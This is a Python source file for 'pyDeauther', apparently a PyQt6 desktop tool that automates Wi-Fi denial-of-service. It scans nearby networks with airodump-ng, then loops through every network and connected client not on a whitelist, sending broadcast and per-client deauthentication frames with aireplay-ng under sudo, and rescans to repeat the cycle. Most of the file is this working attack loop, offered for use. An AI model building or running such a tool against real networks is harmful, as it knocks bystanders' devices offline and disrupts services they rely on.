#Python libs
from __future__ import annotations
import sys, os, sqlite3, json, time
from pathlib import Path
#QT6 libs
from PyQt6.QtWidgets import QApplication
from PyQt6.QtCore import QTimer, QCoreApplication
from PyQt6 import QtWidgets
#App libs
from lib.wifi_importer import import_airodump_to_sqlite, fetch_stats
from lib.gui import run_html_gui, HtmlGuiBridge
from lib.settings_window import create_settings_window, apply_dark_mode
from lib.db_settings import configure, getSettingFromDB, set_setting, get_all_settings
from lib.command_runner import CommandManager, run_command_sync
from lib.output_hud import OutputHUD
from lib.whitelist_lib import edit_whitelist, get_whitelist

agg = None


print("\n\n                     /$$$$$$$                                  /$$     /$$                          ")
print("                    | $$__  $$                                | $$    | $$                          ")
print("  /$$$$$$  /$$   /$$| $$  \\ $$  /$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$  | $$$$$$$   /$$$$$$   /$$$$$$ ")
print(" /$$__  $$| $$  | $$| $$  | $$ /$$__  $$ |____  $$| $$  | $$|_  $$_/  | $$__  $$ /$$__  $$ /$$__  $$")
print("| $$  \\ $$| $$  | $$| $$  | $$| $$$$$$$$  /$$$$$$$| $$  | $$  | $$    | $$  \\ $$| $$$$$$$$| $$  \\__/")
print("| $$  | $$| $$  | $$| $$  | $$| $$_____/ /$$__  $$| $$  | $$  | $$ /$$| $$  | $$| $$_____/| $$      ")
print("| $$$$$$$/|  $$$$$$$| $$$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$/  |  $$$$/| $$  | $$|  $$$$$$$| $$      ")
print("| $$____/  \\____  $$|_______/  \\_______/ \\_______/ \\______/    \\___/  |__/  |__/ \\_______/|__/      ")
print("| $$       /$$  | $$                                                                                ")
print("| $$      |  $$$$$$/                                                                                ")
print("|__/       \\______/                                                                                 ")
print("\n\n# pyDeauther — where the Internet of Things breaks :)\n\n")


# Chromium logging
os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = "--disable-logging --log-level=3"
# Qt logging rules
os.environ["QT_LOGGING_RULES"] = ";".join([
    "qt.webenginecontext.debug=false",
    "qt.webengine.*=false",
    "qt.qpa.*=false",
])
if sys.stderr is not None:
    devnull = os.open(os.devnull, os.O_WRONLY)
    os.dup2(devnull, 2)  # redirect fd 2 (stderr) to /dev/null
#App path
if getattr(sys, 'frozen', False):
    APP_DIR = Path(sys._MEIPASS) if hasattr(sys, "_MEIPASS") else Path(sys.executable).parent
else:
    from pathlib import Path
    APP_DIR = Path(__file__).resolve().parent


#Static variables
CSV_FILE=f"{APP_DIR}/tmp/airodump-01.csv"
DB_FILE = "db/wifi.sqlite"


#Runtime variables
WEB_VIEW = None
settings_win = None 
scannerState=False
currentNet=0
currentClient=0
attackLoop=1
maxAttackLoop=2
lastChannel=0
allow_attack=True
scannerProc=None
wifiState = "Managed"
#Init commands manager
mgr = CommandManager()
created = False
app = QApplication.instance()

from lib.hud_stream import HudStreamAggregator

if app is None:
    app = QApplication(sys.argv)
    created = True
hud = OutputHUD(translucent=False,title="Deauther Output")  # safer on some GPUs



agg = HudStreamAggregator(max_lines=800, interval_ms=75, parent=None)


def _set_text(text: str):
    try:
        hud.set_text(text)
    except Exception as e:
        print("hud.set_text failed:", e)


agg.sig_render.connect(_set_text)
print("agg thread:", agg.thread())
print("main thread:", QCoreApplication.instance().thread())
def init_hud_stream(hud):
    global agg

    def set_text(s: str):
        hud.set_text(s)

    agg = attach_to_output_hud(
        hud,
        max_lines=1500,
        interval_ms=75,
        frame_anchor_regex=r'CH',
        collapse_frames=True
    )
    agg.reset(initial_header="CH  BSSID              PWR  Beacons  #Data, ...") 
    on_out_scanner = make_process_output_handler(agg)
    return agg

def replaceVariable(txt: str, var: str, rep: str) -> str:
    return txt.replace(var, rep)

def deleteCsv():
    global CSV_FILE
    p = Path(CSV_FILE)
    try:
        p.unlink()
    except FileNotFoundError:
        print(f"-------------- UNABLE TO DELETE OLD CSV {CSV_FILE}")
        pass
def clearScansDB(cur, conn):
        cur.execute("DELETE FROM clients;")
        cur.execute("DELETE FROM networks;")
        conn.commit()

def scanForNetworks():


    global APP_DIR, scannerProc
    deleteCsv()
    call_js(WEB_VIEW, "receiveData", {"command":"scannerState","data":"true"})
    cfg = getDBconfig()

    wifiCard=cfg["wifi_card"]
    scanTime=cfg["scan_time"]

    scanCommand = replaceVariable(cfg["scan_cmd"], "%WIFICARD%", wifiCard)
    scanCommand = replaceVariable(scanCommand, "airodump-ng",  "sudo -n $(which airodump-ng)")
    scanCommand = replaceVariable(scanCommand, "%CSV_FILE%",  replaceVariable(CSV_FILE, "-01.csv",  ""))
    print(f"\nExecuting scan command:\n{scanCommand}")
    call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Scanning for "+scanTime+" seconds"})
    scannerState=True
    scannerProc = mgr.run("sudo -n $(which timeout) -s KILL "+scanTime+"s " + "sudo -n " +scanCommand,  on_output=on_out_scanner, on_finished=scan_finished)
    
def attackClientByIndex(bssid,channel):
    global currentClient, currentNet

    cfg = getDBconfig()
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    sql = """
        SELECT client_bssid, associated_network
        FROM clients
        WHERE associated_network = ?
        LIMIT 1 OFFSET ?
    """
    cur.execute(sql, (bssid, currentClient,))
    row = cur.fetchone()

    if row is None:
        currentNet=currentNet+1
        attackNetworkByIndex()
        return None

    client_bssid, associated_network  = row
        
    conn.close()
    
    currentClient = currentClient + 1

    wifiCard=cfg["wifi_card"]
    
    deauth_count=cfg["deauth_count"]
    
    deauthCommand = cfg["lolipop_client_cmd"]

    deauthCommand = replaceVariable(deauthCommand, "%WIFICARD%"     , wifiCard)
    deauthCommand = replaceVariable(deauthCommand, "%BSSID%"        ,bssid)
    deauthCommand = replaceVariable(deauthCommand, "%DEAUTH_COUNT%"  ,deauth_count)
    deauthCommand = replaceVariable(deauthCommand, "%CLIENT_MAC%",  client_bssid)
    deauthCommand = replaceVariable(deauthCommand, "aireplay-ng",  "sudo -n $(which aireplay-ng)")
    
    kill_count = int(deauth_count)
    if (kill_count < 5):
        kill_count=5

    call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Attacking network {bssid} on channel {channel} - CLIENT: {client_bssid}"})
    deauthCmd=f"sudo -n $(which timeout) -s KILL {kill_count}s {deauthCommand}; sleep 1"
    print(f"\nExecuting client deauth command:\n{deauthCmd}")
    h1 = mgr.run(deauthCmd,  on_output=on_out, on_finished=lambda pid, chunk, bssid=bssid, channel=channel: client_attack_finished(pid, chunk, bssid,channel))
    

def setWifiMode(wifiCard,mode = None):
    global wifiState, allow_attack
    if (allow_attack==False):
        return
    cfg = getDBconfig()

    setMonitorModeCmd=replaceVariable(cfg["enable_monitor_cmds"], "ifconfig",  "sudo -n $(which ifconfig)")
    setMonitorModeCmd=replaceVariable(setMonitorModeCmd, "%WIFICARD%",  wifiCard)
    setMonitorModeCmd=replaceVariable(setMonitorModeCmd, "iwconfig",  "sudo -n $(which iwconfig)")
    setMonitorModeCmd=replaceVariable(setMonitorModeCmd, "airmon-ng",  "sudo -n $(which airmon-ng)")


    setManagedModeCmd=replaceVariable(cfg["disable_monitor_cmds"], "ifconfig",  "sudo -n $(which ifconfig)")
    setManagedModeCmd=replaceVariable(setManagedModeCmd, "%WIFICARD%",  wifiCard)
    setManagedModeCmd=replaceVariable(setManagedModeCmd, "iwconfig",  "sudo -n $(which iwconfig)")
    setManagedModeCmd=replaceVariable(setManagedModeCmd, "airmon-ng",  "sudo -n $(which airmon-ng)")

    if setManagedModeCmd.endswith("\n"):
        setManagedModeCmd = setManagedModeCmd[:-2]

    if setMonitorModeCmd.endswith("\n"):
        setMonitorModeCmd = setMonitorModeCmd[:-2]

    setMonitorModeCmd=replaceVariable(setMonitorModeCmd, "\n",  "; sleep 1;")
    setMonitorModeCmd=f"{setMonitorModeCmd}; sleep 1"
    
    setManagedModeCmd=replaceVariable(setManagedModeCmd, "\n",  "; sleep 1;")
    setManagedModeCmd=f"{setManagedModeCmd}; sleep 1"
    
    if (mode != None):
        if (mode == "Monitor"):
            command = setMonitorModeCmd
            newMode = "Monitor"
        else:
            command = setManagedModeCmd
            newMode = "Managed"
    else:
        if (wifiState == "Monitor"):

            command = setManagedModeCmd
            newMode = "Managed"
        else:
            set_mode_finished()
            return

    print(f"\nExecuting set WiFi card mode:\n{command}")
    mgr.run(command,  on_output=nullOutput, on_finished=set_mode_finished)
    call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Changing {wifiCard} mode to {newMode}"})
    
    wifiState=newMode
    
def nullOutput(pid, chunk):
    print(f"[{pid}] {chunk}", end="")
    

def set_mode_finished(pid, chunk):
    global wifiState, allow_attack
    call_js(WEB_VIEW, "receiveData", {"command":"modeState","data":"false"})
    if (allow_attack==False or wifiState=="Managed"):
        return
    scanForNetworks()

def setChannel(channel,wifiCard):
    global lastChannel, allow_attack
    if (allow_attack==False):
        return
    cfg = getDBconfig()
    call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Setting {wifiCard} to channel {channel}"})
    setChannelCommand = replaceVariable(cfg["set_channel_cmd"], "iw",  "sudo -n $(which iw)")
    setChannelCommand = replaceVariable(setChannelCommand, "%WIFICARD%",  wifiCard)
    setChannelCommand = replaceVariable(setChannelCommand, "%CHANNEL%",  f"{channel}")
    setChannelCommand = f"{setChannelCommand}; sleep 1"
    print(f"\nExecuting set channel command:\n{setChannelCommand}")
    mgr.run(setChannelCommand,  on_output=on_out, on_finished=set_channel_finished)
    lastChannel = channel


def set_channel_finished(pid, chunk):
    global allow_attack
    if (allow_attack==False):
        return
    attackNetworkByIndex()

def attackNetworkByIndex():
    global currentNet, currentClient, attackLoop, maxAttackLoop


    currentClient=0
    cfg = getDBconfig()
    maxAttackLoop = int(cfg["max_attack_loop"])
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    whitelist = get_whitelist(DB_FILE)
    sql = """
        SELECT ssid, bssid, channel
        FROM networks
        WHERE CAST(channel AS INTEGER) > 0
        {exclusion}
        ORDER BY CAST(channel AS INTEGER), bssid
        LIMIT 1 OFFSET ?
    """
    params = []
    if whitelist:  # build NOT IN (?, ?, ...)
        placeholders = ",".join("?" * len(whitelist))
        exclusion = f"AND bssid NOT IN ({placeholders})"
        params.extend(whitelist)
    else:
        exclusion = ""

    params.append(int(currentNet))  # ensure it's an int

    cur.execute(sql.format(exclusion=exclusion), params)
    row = cur.fetchone()

    if row is None:
        currentNet=0
        if (attackLoop>=maxAttackLoop):
            attackLoop=1
            call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Max attacks limit reached, re-scanning for targets..."})
            scanForNetworks()
        else:
            attackLoop=attackLoop+1
            call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Re-running attack (Loop {attackLoop}/{maxAttackLoop})"})
            attackNetworkByIndex()
        return

    ssid, bssid, channel = row
   
    conn.close()
    
    wifiCard=cfg["wifi_card"]
    if (channel=="-1"):
        currentNet=currentNet+1
        attackNetworkByIndex()

    
    if (lastChannel!=channel):
        setChannel(channel,wifiCard)
        return

    
    deauth_count=cfg["deauth_count"]
    
    deauthCommand = cfg["lolipop_broadcast_cmd"]

    deauthCommand = replaceVariable(deauthCommand, "%WIFICARD%"     , wifiCard)
    deauthCommand = replaceVariable(deauthCommand, "%BSSID%"        ,bssid)
    deauthCommand = replaceVariable(deauthCommand, "%DEAUTH_COUNT%"  ,deauth_count)
    deauthCommand = replaceVariable(deauthCommand, "aireplay-ng",  "sudo -n $(which aireplay-ng)")

    kill_count = int(deauth_count)
    if (kill_count < 3):
        kill_count=3

    call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":f"Attacking network {bssid} on channel {channel}"})
    deauthCmd=f"sudo -n $(which timeout) -s KILL {kill_count}s {deauthCommand}; sleep 1"
    print(f"\nExecuting broadcast deauth command:\n{deauthCmd}")
    h1 = mgr.run(deauthCmd,  on_output=on_out, on_finished=lambda pid, chunk, bssid=bssid, channel=channel: attack_finished(pid, chunk, bssid,channel))

    

def attack_finished(pid, chunk, bssid,channel):
    global allow_attack
    if (allow_attack==False):
        return
    attackClientByIndex(bssid,channel)

def client_attack_finished(pid, chunk, bssid, channel):
    global allow_attack
    if (allow_attack==False):
        return

    attackClientByIndex(bssid,channel)

def attackWifis():
    currentNet=0
    attackNetworkByIndex()

def testCommand():
    h1 = mgr.run("echo hello && echo world", on_output=on_out, on_finished=on_finish)
    h2 = mgr.run("ls -la /root", elevate=True, method="pkexec", on_output=on_out, on_finished=on_finish)

def on_out(pid, chunk):
    hud.append(chunk)
    hud.show_hud()

def on_out_scanner(pid, chunk):
    hud.show_hud()
    agg.feed(chunk)
    


def scan_finished(pid, chunk):
    global allow_attack
    if (allow_attack==False):
        return
    call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":["Scan finished!","Proccessing scan data..."]})
    readWifis()
    call_js(WEB_VIEW, "receiveData", {"command":"attackState","data":"true"})
    attackWifis()
    call_js(WEB_VIEW, "receiveData", {"command":"scannerState","data":"false"})

def on_finish(pid, code):
    h = mgr.get(pid)
    print(f"\n[{pid}] finished with code {code}")
    print("--- buffered stdout ---")
    print(h.output_text())
    print("--- buffered stderr ---")
    print(h.error_text())


def readWifis():    
    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        clearScansDB(cur, conn)
    finally:
        conn.close()

    try:
        parsed_n, parsed_c = import_airodump_to_sqlite(CSV_FILE, DB_FILE)
        a = "Loaded targets: {} networks, {} clients.".format(parsed_n, parsed_c)
        call_js(WEB_VIEW, "receiveData", {"command":"typeOut","data":a})
        
        
        db_n, db_c = fetch_stats(DB_FILE)

    except Exception as e:
        print(f"Import failed: {e}")
        

    try:
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        
        print("\nNetworks found:")

        for row in cur.execute("SELECT ssid, bssid, channel FROM networks WHERE CAST(channel AS INTEGER) > 0 ORDER BY bssid"):
            print(row)

        print("\nClients found:")
      
        for row in cur.execute("SELECT client_bssid, COALESCE(associated_network,'<NULL>') FROM clients WHERE associated_network IS NOT NULL AND associated_network <> '' ORDER BY client_bssid"):
            print(row)

    finally:
        conn.close()
    print("\n")

def on_command(payload: dict) -> None:
    global WEB_VIEW, allow_attack
    cfg = getDBconfig()
    wifiCard=cfg["wifi_card"]
    print("[UI] got frontent command:", payload)
    cmd = (payload.get("command") or "").lower()
    data = payload.get("data")
    if cmd == "exit":
        QApplication.instance().quit()
    elif cmd == "ping":
        print("[UI] pong:", data)
    elif cmd == "scan":
        allow_attack=True
        call_js(WEB_VIEW, "receiveData", {"command":"modeState","data":"true"})
        setWifiMode(wifiCard,"Monitor")
    elif cmd == "stop_attack":
        setWifiMode(wifiCard,None)
        allow_attack=False
        if (scannerProc!=None):
            scannerProc.kill()
    elif cmd == "settings":
        global settings_win
        app = QApplication.instance() or QApplication([])
        apply_dark_mode(app)
        settings_win = create_settings_window(DB_FILE)  # no parent
        settings_win.show()
        settings_win.raise_()
        settings_win.activateWindow()
    elif cmd == "whitelist":
        edit_whitelist(DB_FILE)

        
def getDBconfig():
    configure(DB_FILE)
    cfg = get_all_settings(cast_map={"fast_mode": "bool", "retries": "int", "automatic_turn_on": "bool"})
    return cfg
    
def on_loaded(view, bridge):
    global WEB_VIEW
    

    payload = {"command": "pyConfig", "data": getDBconfig()}
    view.page().runJavaScript(
        f"receiveData({json.dumps(payload)})",
        lambda result: print("Frontend ready!:", result)  # callback is optional
    )
    WEB_VIEW=view
    
    hud.hide_hud()
    
    hud.setWindowOpacity(0.85)


def call_js(view, func_name: str, arg):
    
    import json
    view.page().runJavaScript(f"{func_name}({json.dumps(arg)})")


if __name__ == "__main__":    
    
    exit_code = run_html_gui(
        html_path="www/index.html",
        width=800,
        height=745,
        title="pyDeauther",
        initial_py_to_js={"appState": "ready"},
        on_command=on_command,
        on_loaded=on_loaded
    )
    raise SystemExit(exit_code)